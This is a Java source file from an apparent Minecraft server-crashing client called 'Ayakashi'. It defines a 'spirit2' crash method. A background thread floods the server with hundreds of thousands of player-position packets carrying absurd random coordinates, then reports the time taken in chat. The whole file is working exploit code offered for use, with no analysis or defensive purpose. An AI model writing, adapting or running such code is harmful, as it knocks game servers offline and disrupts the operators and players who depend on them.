package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.helpers.RandomHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C03PacketPlayer;

@CrashInfo(
        name = "spirit2"
)
public class CrashSpirit2 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Spirit method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));

        (new Thread(() -> {
            try {
                for (int i = 0; i < packets; ++i) {
                    for (int i3 = 0; i3 < 100; ++i3)
                        Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.getMinecraft().thePlayer.posX + (double) RandomHelper.getRandomHelper().getRandomInt(1000, Integer.MAX_VALUE), Minecraft.getMinecraft().thePlayer.posX + (double) RandomHelper.getRandomHelper().getRandomInt(1000, Integer.MAX_VALUE), Minecraft.getMinecraft().thePlayer.posX + (double) RandomHelper.getRandomHelper().getRandomInt(1000, Integer.MAX_VALUE), Minecraft.getMinecraft().thePlayer.onGround));
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
